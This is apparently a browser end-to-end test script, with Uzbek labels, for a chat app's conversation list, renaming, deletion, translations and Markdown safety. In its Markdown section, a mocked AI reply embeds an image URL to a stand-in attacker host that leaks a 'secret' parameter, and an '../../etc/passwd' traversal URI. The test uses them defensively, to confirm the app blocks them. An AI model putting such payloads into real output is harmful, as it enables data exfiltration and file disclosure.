// Suhbatlar ro'yxati, Markdown xavfsizligi, uzun satrlar, havola kontrasti, tarjimalar
import { browser, userCtx, check, summary, SHOTS, WEB, API, sleep, hOverflow } from "./h.mjs";

const b = await browser();
const { ctx } = await userCtx(b, { tag: "chat2", prefs: { theme: "light" } });
const page = await ctx.newPage();
const errors = [];
page.on("pageerror", (e) => errors.push(String(e)));

// 55 ta suhbat (sahifa 50 ta)
for (let i = 1; i <= 55; i++) {
  const c = await (await ctx.request.post(`${API}/conversations`)).json();
  await ctx.request.patch(`${API}/conversations/${c.id}`, { data: { title: `suhbat ${i}` } });
}
await page.goto(WEB + "/chat");
await page.waitForLoadState("networkidle");
const rows = page.locator("#chat-list button.truncate");
check("ro'yxat: birinchi sahifa 50 ta", (await rows.count()) === 50, String(await rows.count()));
await page.getByRole("button", { name: "Yana yuklash" }).click();
await sleep(800);
check("ro'yxat: 'Yana yuklash' dan keyin 55 ta", (await rows.count()) === 55, String(await rows.count()));
check("ro'yxat: oxirgi sahifadan keyin tugma yo'q", !(await page.getByRole("button", { name: "Yana yuklash" }).isVisible()));

// Qidiruv
await page.getByPlaceholder("Suhbatlarni qidirish…").fill("suhbat 5");
await sleep(900);
const found = await rows.allInnerTexts();
check("qidiruv: faqat mos sarlavhalar", found.length === 7 && found.every((t) => t.includes("suhbat 5")), found.join(","));
await page.getByPlaceholder("Suhbatlarni qidirish…").fill("yoq-narsa-xyz");
await sleep(900);
check("qidiruv: natija yo'q xabari", await page.getByText("Hech narsa topilmadi").or(page.getByText(/topilmadi/)).first().isVisible());
await page.getByPlaceholder("Suhbatlarni qidirish…").fill("");
await sleep(900);

// Klaviatura: sarlavhaga fokus -> Tab -> "Nomini o'zgartirish" ko'rinadi
const first = rows.first();
await first.focus();
await page.keyboard.press("Tab");
await sleep(400); // opacity animatsiyasi
const focused = await page.evaluate(() => document.activeElement?.getAttribute("aria-label"));
check("klaviatura: Tab sarlavhadan keyin 'Nomini o'zgartirish' ga o'tadi", focused === "Nomini o‘zgartirish", String(focused));
const renameBtn = page.getByRole("button", { name: "Nomini o‘zgartirish" }).first();
const op = await renameBtn.evaluate((el) => getComputedStyle(el.parentElement).opacity);
check("klaviatura: fokusda amal tugmalari ko'rinadi", op === "1", `opacity=${op}`);
await page.keyboard.press("Enter");
const edit = page.locator("#chat-list input:not([type=search])");
await edit.fill("yangi nom ✓");
await edit.press("Enter");
await sleep(600);
const titles = (await (await ctx.request.get(`${API}/conversations?q=yangi%20nom`)).json()).map((c) => c.title);
check("nomlash: serverda saqlandi", titles.includes("yangi nom ✓"), titles.join(","));
// Esc nomlashni bekor qiladi
await page.getByRole("button", { name: "Nomini o‘zgartirish" }).first().click();
await edit.fill("bekor bo'ladi");
await edit.press("Escape");
await sleep(300);
check("nomlash: Esc bekor qiladi", !(await page.getByText("bekor bo'ladi").isVisible()) && (await rows.first().innerText()) === "yangi nom ✓");

// O'chirish: tasdiq, bekor qilish, keyin o'chirish
const total0 = (await (await ctx.request.get(`${API}/conversations?limit=200`)).json()).length;
await rows.first().hover();
await page.getByRole("button", { name: "O‘chirish" }).first().click();
check("o'chirish: tasdiq so'raladi", await page.getByText("Suhbat o‘chirilsinmi?").isVisible());
await page.getByRole("button", { name: "Bekor qilish" }).click();
check("o'chirish: bekor qilindi", (await (await ctx.request.get(`${API}/conversations?limit=200`)).json()).length === total0);
await rows.first().hover();
await page.getByRole("button", { name: "O‘chirish" }).first().click();
await page.locator("#chat-list button.bg-red-600").click();
await sleep(800);
check("o'chirish: tasdiqdan keyin o'chdi", (await (await ctx.request.get(`${API}/conversations?limit=200`)).json()).length === total0 - 1);

// Standart sarlavha "New chat" interfeys tilida
await ctx.request.post(`${API}/conversations`);
await page.reload();
await page.waitForLoadState("networkidle");
check("sarlavha: 'New chat' o'zbekcha ko'rinadi", (await rows.first().innerText()) === "Yangi suhbat");

// Markdown: AI javobini soxtalashtiramiz (SSE) — tashqi rasm, noto'g'ri omni-media, uzun satr, havola
const LONG = "x".repeat(600);
const MD = `Havola: [OmniAI sayti](https://example.com/sahifa)\n\n![tashqi](https://evil.example/leak.png?d=secret)\n\n![yomon](omni-media://../../etc/passwd)\n\n${LONG}\n\n\`\`\`js\nconsole.log("${"y".repeat(300)}")\n\`\`\``;
await page.route("**/api/conversations/*/messages", async (route) => {
  if (route.request().method() !== "POST") return route.continue();
  const ev = (o) => `data: ${JSON.stringify(o)}\n\n`;
  await route.fulfill({
    status: 200,
    headers: { "content-type": "text/event-stream", "access-control-allow-origin": WEB, "access-control-allow-credentials": "true" },
    body: ev({ type: "delta", text: MD }) + ev({ type: "done", message_id: "x", model: "gemini-2.5-flash" }),
  });
});
const external = [];
page.on("request", (r) => r.url().includes("evil.example") && external.push(r.url()));
await page.getByRole("button", { name: "Yangi suhbat" }).first().click();
await page.locator("textarea").fill("markdown sinov");
await page.locator("textarea").press("Enter");
await page.getByText("Havola:").waitFor({ timeout: 10000 });
await sleep(800);
check("markdown: tashqi rasm avtomatik yuklanmadi", external.length === 0, external.join(","));
const loadBtn = page.getByRole("button", { name: "Rasmni yuklash (evil.example)" });
check("markdown: 'Rasmni yuklash' tugmasi bor", await loadBtn.isVisible());
check("markdown: noto'g'ri omni-media rasm emas, matn", (await page.locator("img[alt=yomon]").count()) === 0 && (await page.getByText("[yomon]").isVisible()));
const bubble = page.locator("div.bg-neutral-800.rounded-lg").last();
const bw = await bubble.evaluate((el) => ({ w: el.getBoundingClientRect().width, sw: el.scrollWidth, cw: el.clientWidth, parent: el.parentElement.getBoundingClientRect().width }));
check("uzun satr: pufakchadan chiqmaydi", bw.sw <= bw.cw + 1 && bw.w <= bw.parent + 1, JSON.stringify(bw));
// highlight.js: aylantirish <pre> yoki ichidagi <code.hljs> da bo'ladi — ikkalasidan biri aylanishi va pufakcha kengaymasligi kerak
const pre = await page.locator("pre").last().evaluate((el) => {
  const box = [el, el.querySelector("code")].find((x) => x && x.scrollWidth > x.clientWidth);
  return { scroller: box?.tagName ?? null, ox: box ? getComputedStyle(box).overflowX : null, preW: el.getBoundingClientRect().width };
});
check("kod bloki: o'z ichida gorizontal aylanadi", !!pre.scroller && ["auto", "scroll"].includes(pre.ox), JSON.stringify(pre));
check("uzun satr: sahifada gorizontal aylantirish yo'q", (await hOverflow(page)) <= 0);
// Havola rangi yorug' mavzuda: kontrast >= 4.5
const contrast = await page.locator(".markdown a").first().evaluate((a) => {
  const rgb = (s) => s.match(/[\d.]+/g).slice(0, 3).map(Number);
  const lum = ([r, g, b]) => { const f = (c) => { c /= 255; return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4; }; return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b); };
  let el = a, bg = "rgba(0, 0, 0, 0)";
  while (el && (bg = getComputedStyle(el).backgroundColor) === "rgba(0, 0, 0, 0)") el = el.parentElement;
  const L1 = lum(rgb(getComputedStyle(a).color)), L2 = lum(rgb(bg));
  return { ratio: (Math.max(L1, L2) + 0.05) / (Math.min(L1, L2) + 0.05), color: getComputedStyle(a).color, bg, target: a.target, rel: a.rel };
});
check("havola: yorug' mavzuda kontrast >= 4.5", contrast.ratio >= 4.5, JSON.stringify(contrast));
check("havola: yangi oynada, noopener", contrast.target === "_blank" && contrast.rel.includes("noopener"));
await page.screenshot({ path: `${SHOTS}chat-markdown-light.png` });
await loadBtn.click();
await sleep(500);
check("markdown: bosilgandan keyin rasm yuklanadi", external.length === 1);
await page.unroute("**/api/conversations/*/messages");

// Tillar: en/ru — asosiy matnlar va Auto sababi tarjimada
for (const [lang, newChat, kind] of [["en", "New chat", "code"], ["ru", "Новый чат", "код"]]) {
  await ctx.request.patch(`${API}/me`, { data: { preferences: { language: lang } } });
  await page.goto(WEB + "/chat");
  await page.waitForLoadState("networkidle");
  check(`${lang}: 'Yangi suhbat' tugmasi tarjimada`, await page.getByRole("button", { name: newChat }).first().isVisible());
  check(`${lang}: standart sarlavha tarjimada`, (await rows.allInnerTexts()).includes(newChat), (await rows.allInnerTexts()).slice(0, 3).join(","));
  await page.locator("textarea").fill("python kod yozib ber funksiya");
  await page.locator("textarea").press("Enter");
  await page.getByText(/Auto →/).last().waitFor({ timeout: 15000 });
  await sleep(1500);
  const label = await page.locator("div.bg-neutral-800.rounded-lg .mb-1.text-xs").last().innerText();
  check(`${lang}: Auto sababi tarjima qilingan`, label.includes(`· ${kind}`), label);
  // Reloaddan keyin model nomi xom id emas
  await page.reload();
  await page.waitForLoadState("networkidle");
  const lbl2 = await page.locator("div.bg-neutral-800.rounded-lg .mb-1.text-xs").last().innerText();
  check(`${lang}: reloaddan keyin model nomi chiroyli`, /Gemini/.test(lbl2), lbl2);
  await page.screenshot({ path: `${SHOTS}chat-${lang}.png` });
}

check("sahifada JS xatosi yo'q", errors.length === 0, errors.join(" | ").slice(0, 300));
await b.close();
summary();
